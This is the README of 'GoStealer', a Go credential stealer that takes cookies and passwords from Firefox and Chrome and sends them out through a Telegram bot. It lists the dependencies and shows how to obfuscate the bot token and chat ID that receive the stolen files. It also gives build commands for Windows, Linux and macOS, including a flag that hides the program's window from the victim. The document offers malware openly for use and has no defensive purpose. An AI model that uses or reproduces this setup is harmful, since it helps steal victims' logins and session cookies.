# GoStealer

#### **a cookies/passwords stealer written in GoLang support `FireFox` and `Chrome` using Telegram**

### Libraries
> https://github.com/zalando/go-keyring
>
> https://github.com/Pallinder/go-randomdata
>
> https://github.com/mattn/go-sqlite3
>
> https://github.com/tidwall/gjson
>
> https://golang.org/x/crypto/pbkdf2

```
go get github.com/Pallinder/go-randomdata
go get github.com/mattn/go-sqlite3
go get github.com/tidwall/gjson
go get github.com/zalando/go-keyring
go get golang.org/x/crypto/pbkdf2
```
**- go-sqlite3 needs [gcc on windows](https://github.com/jmeubank/tdm-gcc/releases/download/v10.3.0-tdm64-2/tdm64-gcc-10.3.0-2.exe) cause it depends on some c librares, install it, then make its bin folder PATH as a new environment variable**

## setup

> to change the files destination you need to use [mumbojumbo](https://github.com/jeromer/mumbojumbo) tool to obfuscate the strings, usage: ```mumbojumbo -s="x" -p=foo``` x is the bot token or the chat ID format `sendDocument?chat_id={ID}` then just copy the content of `func Get() { Copy this }` then paste in `ERxr8Z1` for bot token or `Wprep42` for Chat ID
>
> change the function called `ERxr8Z1` in `RiC4ef.go` with the obfuscated "bot token of telegram you just made" by [mumbojumbo](https://github.com/jeromer/mumbojumbo).
>
> then replace `Wprep42` function in `RiC4ef.go` with the obfuscated "chat ID which the stealer will send the files to" in format `sendDocument?chat_id={ID}` by [mumbojumbo](https://github.com/jeromer/mumbojumbo).

## build

### Windows (compile on windows only)
```
go build -ldflags "-s -w" -o stealer.exe .
```
**To hide the window**
```
go build -ldflags "-s -w -H=windowsgui" -o stealer.exe .
```
### Linux
```
GOOS=linux ARCH=386 go build -ldflags "-s -w" -o stealer .
```
### MacOS
```
GOOS=darwin ARCH=amd64 go build -ldflags "-s -w" -o stealer .
```

## Contact

> Instagram: [@0xhades](https://instagram.com/0xhades)

**- If you really want the unobfuscated strings of the source code just tell me to add it, cause i'm lazy to do it right now**


